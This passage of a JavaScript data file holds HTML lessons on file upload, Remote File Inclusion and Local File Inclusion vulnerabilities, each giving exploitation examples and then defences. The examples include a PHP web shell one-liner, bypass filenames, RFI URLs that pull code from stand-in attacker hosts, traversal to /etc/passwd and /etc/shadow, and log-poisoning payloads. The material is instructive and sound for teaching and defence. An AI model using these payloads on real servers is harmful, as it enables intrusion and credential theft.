        <p>This vulnerability commonly appears in upload features such as profile pictures, attachments, documents, media files, or administrative panels.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application accepts user-uploaded files without performing proper validation on file type, extension, content, or storage location.</p>

        <h3>Common Weak Validation Methods:</h3>

        <pre><code>Checking file extension only

Checking MIME type only

Blacklisting dangerous extensions

Trusting client-side validation</code></pre>

        <h3>Dangerous File Types:</h3>

        <pre><code>.php
.jsp
.asp
.aspx
.cgi
.py
.pl</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

move_uploaded_file(
    $_FILES['file']['tmp_name'],
    "uploads/" . $_FILES['file']['name']
);</code></pre>

        <p>The application uploads the file directly without validation.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>shell.php</code></pre>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <p>If the file is uploaded successfully, the attacker may execute commands using:</p>

        <pre><code>http://target.com/uploads/shell.php?cmd=whoami</code></pre>

        <h3>Why is File Upload Dangerous?</h3>

        <p>Successful exploitation may allow attackers to execute remote commands, upload web shells, bypass authentication, steal sensitive files, or fully take control of the server.</p>

        <h3>Common Upload Bypass Techniques:</h3>

        <pre><code>shell.php.jpg

shell.phtml

shell.php%00.jpg

shell.php....

shell.php;.jpg</code></pre>

        <h3>MIME Type Bypass:</h3>

        <p>Some applications only verify the MIME type sent by the browser.</p>

        <pre><code>Content-Type: image/jpeg</code></pre>

        <p>An attacker can modify the request manually using Burp Suite.</p>

        <h3>Double Extension Bypass:</h3>

        <pre><code>shell.php.jpg</code></pre>

        <p>Some servers may still execute the file as PHP depending on server configuration.</p>

        <h3>Null Byte Injection:</h3>

        <pre><code>shell.php%00.jpg</code></pre>

        <p>Older systems may stop processing the filename after the null byte.</p>

        <h3>Image-Based Payloads:</h3>

        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <p>The attacker hides malicious code inside image files.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Code Execution (RCE).</p>
        <p>2. Uploading Web Shells.</p>
        <p>3. Defacing websites.</p>
        <p>4. Stealing sensitive data.</p>
        <p>5. Gaining persistent access.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /upload HTTP/1.1
Host: vulnerable-site.com

Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg</code></pre>

        <h3>Common Web Shells:</h3>

        <pre><code>C99 Shell
WSO Shell
b374k
China Chopper</code></pre>

        <h3>Indicators of File Upload Vulnerability:</h3>

        <p>1. Missing file extension validation.</p>
        <p>2. Upload directory accessible publicly.</p>
        <p>3. Uploaded files execute as scripts.</p>
        <p>4. Weak MIME type verification.</p>
        <p>5. No file content inspection.</p>

        <h3>Dangerous Upload Locations:</h3>

        <pre><code>/uploads/
/images/
/avatars/
/files/</code></pre>

        <h3>Example of Weak Blacklist Filtering:</h3>

        <pre><code>if(filename != ".php")</code></pre>

        <p>Attackers can bypass weak blacklist filters using alternative extensions.</p>

        <h3>Safe Validation Example:</h3>

        <pre><code>// Secure Example

Allow only specific extensions

Verify MIME type

Validate file signatures

Rename uploaded files

Store files outside web root</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use whitelist validation instead of blacklist validation.</b></p>

        <p><b>2. Verify file signatures and content.</b></p>

        <p><b>3. Rename uploaded files randomly.</b></p>

        <p><b>4. Store uploaded files outside the web root.</b></p>

        <p><b>5. Disable script execution inside upload directories.</b></p>

        <p><b>6. Restrict file permissions.</b></p>

        <p><b>7. Limit file size and upload types.</b></p>

        <h3>Common Security Configurations:</h3>

        <pre><code>Disable PHP execution in uploads/

Use separate file servers

Apply Content Security Policy (CSP)

Scan uploads using antivirus solutions</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Difference Between Safe and Unsafe Uploads:</h3>

        <p><b>Unsafe Upload:</b> The application stores user files directly and allows script execution.</p>

        <p><b>Safe Upload:</b> The application validates, sanitizes, renames, and securely stores uploaded files.</p>

        <h3>Vulnerability Severity:</h3>

        <p>File Upload Vulnerability is extremely critical because a successful attack may lead to full server compromise, remote command execution, malware deployment, data theft, or complete website takeover.</p>
    `
},

{
    "id": 13,
    "title": "Remote File Inclusion (RFI)",
    "summary": `
        <p><b>Remote File Inclusion (RFI)</b> is a critical web vulnerability that allows attackers to include and execute remote files on a vulnerable server. This vulnerability commonly affects web applications that dynamically load files without properly validating user input.</p>

        <p>RFI vulnerabilities are especially dangerous because they may lead to Remote Code Execution (RCE), server compromise, web shell uploads, or complete control over the target system.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application accepts user-controlled input and directly includes files from external sources without proper validation.</p>

        <h3>Common Vulnerable Functions:</h3>

        <pre><code>include()
require()
include_once()
require_once()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$page = $_GET['page'];

include($page);</code></pre>

        <p>The application directly includes files based on user input.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.txt</code></pre>

        <p>If remote file inclusion is enabled, the server will fetch and execute the remote file.</p>

        <h3>Example of a Malicious Remote File:</h3>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <h3>Executing Commands:</h3>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.txt&cmd=whoami</code></pre>

        <p>The attacker may execute operating system commands on the vulnerable server.</p>

        <h3>Why is RFI Dangerous?</h3>

        <p>Successful exploitation may allow attackers to upload web shells, execute remote commands, steal sensitive files, gain persistent access, or completely compromise the target server.</p>

        <h3>Requirements for RFI Exploitation:</h3>

        <pre><code>allow_url_include = On

allow_url_fopen = On</code></pre>

        <p>These PHP configurations allow remote files to be included from external URLs.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Code Execution (RCE).</p>
        <p>2. Uploading Web Shells.</p>
        <p>3. Stealing sensitive data.</p>
        <p>4. Privilege escalation.</p>
        <p>5. Full server takeover.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /index.php?page=http://attacker.com/shell.txt HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Payloads:</h3>

        <pre><code>http://attacker.com/shell.txt

https://evil.com/malicious.php

ftp://attacker.com/backdoor.txt</code></pre>

        <h3>Difference Between RFI and LFI:</h3>

        <p><b>RFI:</b> Includes remote files hosted on external servers.</p>

        <p><b>LFI:</b> Includes local files stored on the target server itself.</p>

        <h3>Example of Weak Filtering:</h3>

        <pre><code>if(page != "http://")</code></pre>

        <p>Attackers may bypass weak filtering using encoding or alternative protocols.</p>

        <h3>Protocol Wrapper Exploitation:</h3>

        <pre><code>php://input

data://

zip://</code></pre>

        <p>Attackers may abuse PHP wrappers to bypass restrictions or execute malicious code.</p>

        <h3>Common Indicators of RFI:</h3>

        <p>1. Dynamic file inclusion using user input.</p>
        <p>2. URL parameters controlling included files.</p>
        <p>3. Error messages related to include() or require().</p>
        <p>4. PHP warnings exposing file paths.</p>

        <h3>Testing for RFI:</h3>

        <pre><code>?page=http://example.com/test.txt</code></pre>

        <p>If the external content appears inside the application response, the application may be vulnerable.</p>

        <h3>Safe Example:</h3>

        <pre><code>// Secure Example

$pages = [
    "home" => "home.php",
    "about" => "about.php"
];

include($pages[$_GET['page']]);</code></pre>

        <p>The application uses a strict whitelist instead of direct user input.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Disable allow_url_include.</b></p>

        <p><b>2. Avoid direct file inclusion using user input.</b></p>

        <p><b>3. Use strict whitelist validation.</b></p>

        <p><b>4. Restrict accessible directories.</b></p>

        <p><b>5. Sanitize and validate all input.</b></p>

        <p><b>6. Disable dangerous PHP wrappers when unnecessary.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Disable remote includes

Use least privilege permissions

Monitor server logs

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may install malware, create backdoors, steal databases, pivot into internal networks, or completely destroy application integrity.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Remote File Inclusion is considered highly critical because it may directly lead to Remote Code Execution and full server compromise, especially on poorly configured PHP applications.</p>
    `
},

{
    "id": 14,
    "title": "Local File Inclusion (LFI)",
    "summary": `
        <p><b>Local File Inclusion (LFI)</b> is a dangerous web vulnerability that allows attackers to include and read files stored locally on the target server. This vulnerability usually occurs when web applications dynamically load files based on user input without proper validation.</p>

        <p>LFI vulnerabilities may lead to sensitive information disclosure, source code exposure, log poisoning, remote code execution, or complete server compromise under certain conditions.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application accepts user-controlled input and directly includes local files without validating the requested path.</p>

        <h3>Common Vulnerable Functions:</h3>

        <pre><code>include()
require()
include_once()
require_once()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$page = $_GET['page'];

include($page);</code></pre>

        <p>The application includes files directly from user input.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/index.php?page=../../../../etc/passwd</code></pre>

        <p>The attacker attempts to read sensitive system files using directory traversal.</p>

        <h3>Common Sensitive Files:</h3>

        <pre><code>/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:\\Windows\\win.ini
C:\\boot.ini</code></pre>

        <h3>Why is LFI Dangerous?</h3>

        <p>Successful exploitation may allow attackers to read sensitive configuration files, obtain credentials, expose application source code, or even execute code using advanced exploitation techniques.</p>

        <h3>Directory Traversal Technique:</h3>

        <pre><code>../../../../</code></pre>

        <p>Attackers use directory traversal sequences to move outside the intended directory.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /index.php?page=../../../../etc/passwd HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Reading sensitive files.</p>
        <p>2. Accessing configuration files.</p>
        <p>3. Extracting credentials.</p>
        <p>4. Source code disclosure.</p>
        <p>5. Achieving Remote Code Execution.</p>

        <h3>Log Poisoning Technique:</h3>

        <p>Attackers may inject PHP code into log files and later include them through the LFI vulnerability.</p>

        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <h3>Example of Log Poisoning:</h3>

        <pre><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <p>The attacker later accesses:</p>

        <pre><code>http://target.com/index.php?page=/var/log/apache2/access.log&cmd=whoami</code></pre>

        <h3>PHP Wrappers Exploitation:</h3>

        <pre><code>php://filter

php://input

data://</code></pre>

        <p>PHP wrappers may help attackers read source code or execute malicious input.</p>

        <h3>Reading Source Code:</h3>

        <pre><code>php://filter/convert.base64-encode/resource=index.php</code></pre>

        <p>The application source code may be displayed in Base64 format.</p>

        <h3>Null Byte Injection:</h3>

        <pre><code>../../../../etc/passwd%00</code></pre>

        <p>Older systems may truncate the filename after the null byte.</p>

        <h3>Common Indicators of LFI:</h3>

        <p>1. Dynamic file inclusion parameters.</p>
        <p>2. Error messages exposing file paths.</p>
        <p>3. URL parameters controlling file loading.</p>
        <p>4. Inclusion of local templates or pages.</p>

        <h3>Weak Filtering Example:</h3>

        <pre><code>str_replace("../", "", input)</code></pre>

        <p>Attackers may bypass weak filtering using encoding or alternative traversal patterns.</p>

        <h3>Common Bypass Techniques:</h3>

        <pre><code>....//

..%2f

%252e%252e%252f</code></pre>

        <h3>Safe Example:</h3>

        <pre><code>// Secure Example

$pages = [
    "home" => "home.php",
    "about" => "about.php"
];

include($pages[$_GET['page']]);</code></pre>

        <p>The application uses a strict whitelist instead of direct user input.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid direct file inclusion from user input.</b></p>

        <p><b>2. Use whitelist validation.</b></p>

        <p><b>3. Restrict accessible directories.</b></p>

        <p><b>4. Sanitize and validate all paths.</b></p>

        <p><b>5. Disable unnecessary PHP wrappers.</b></p>

        <p><b>6. Restrict file permissions.</b></p>

        <p><b>7. Hide detailed error messages.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Use least privilege permissions

Disable dangerous functions

Monitor logs continuously

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Difference Between LFI and RFI:</h3>

        <p><b>LFI:</b> Includes local files already stored on the target server.</p>

        <p><b>RFI:</b> Includes remote files hosted on external servers.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal sensitive credentials, access application secrets, execute malicious code, compromise servers, or pivot deeper into internal infrastructure.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Local File Inclusion is highly critical because it may expose sensitive system files and, in advanced exploitation scenarios, lead to Remote Code Execution and complete server compromise.</p>
    `
},

];
